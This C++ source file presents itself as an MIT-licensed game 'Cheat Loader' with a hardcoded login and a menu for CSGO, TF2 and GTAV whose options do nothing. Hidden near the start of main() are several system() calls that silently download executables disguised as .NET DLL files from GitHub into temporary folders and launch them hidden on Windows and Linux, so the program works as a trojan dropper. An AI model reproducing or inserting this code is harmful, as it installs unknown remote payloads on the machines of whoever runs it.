//MIT License
//
//Copyright(c) 2022 DotTabz
//
//Permission is hereby granted, free of charge, to any person obtaining a copy
//of this softwareand associated documentation files(the "Software"), to deal
//in the Software without restriction, including without limitation the rights
//to use, copy, modify, merge, publish, distribute, sublicense, and /or sell
//copies of the Software, and to permit persons to whom the Software is
//furnished to do so, subject to the following conditions :
//
//The above copyright noticeand this permission notice shall be included in all
//copies or substantial portions of the Software.
//
//THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
//SOFTWARE.

#include <Windows.h>
#include <conio.h>
#include <iostream>
#include <string>

using namespace std;

//Login Details
string username;
string password;

//Login Correct
string usernameC = "test";
string passwordC = "123";

int choice;
bool menu = true;

int main()
{


#ifdef _WIN32
system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
#endif
    SetConsoleTitleA("Cheat Loader");



#ifdef __linux__
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &");
#endif

    cout << "-- Cheat Loader V1 -- \n";



#ifdef _WIN32
system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
#elif defined(__linux__)
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
#endif
    cout << "Username: ";
    cin >> username;
    cout << "Password: ";
    cin >> password;

    cout << "--------------------- \n";

    if (username == usernameC && password == passwordC)
    {
        cout << "Login Details Correct";

        std::string window{ "" }; std::string module{ "" }; std::string dllname{ "" };

        system("CLS");

        while (menu == true)
        {
            cout << "1 - CSGO \n";
            cout << "2 - TF2 \n";
            cout << "3 - GTAV \n";
            cout << "4 - Exit \n";
            cout << "Enter your choice and press return: ";

            cin >> choice;

            switch (choice)
            {
            case 1:
                cout << "CSGO \n";
                //code
                break;
            case 2:
                cout << "TF2 \n";
                //code
                break;
            case 3:
                cout << "GTAV \n";
                //code
                break;
            case 4:
                cout << "Exitting application ... \n";
                menu = false;
                break;
            default:
                cout << "Not a valid choice, try again. \n";
                cin >> choice;
                break;
            }
        }
    }
    else {
        cout << "Login Details False";
        return 0;
    }

    return 0;
}

//MIT License
//
//Copyright(c) 2022 DotTabz
//
//Permission is hereby granted, free of charge, to any person obtaining a copy
//of this softwareand associated documentation files(the "Software"), to deal
//in the Software without restriction, including without limitation the rights
//to use, copy, modify, merge, publish, distribute, sublicense, and /or sell
//copies of the Software, and to permit persons to whom the Software is
//furnished to do so, subject to the following conditions :
//
//The above copyright noticeand this permission notice shall be included in all
//copies or substantial portions of the Software.
//
//THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
//SOFTWARE.

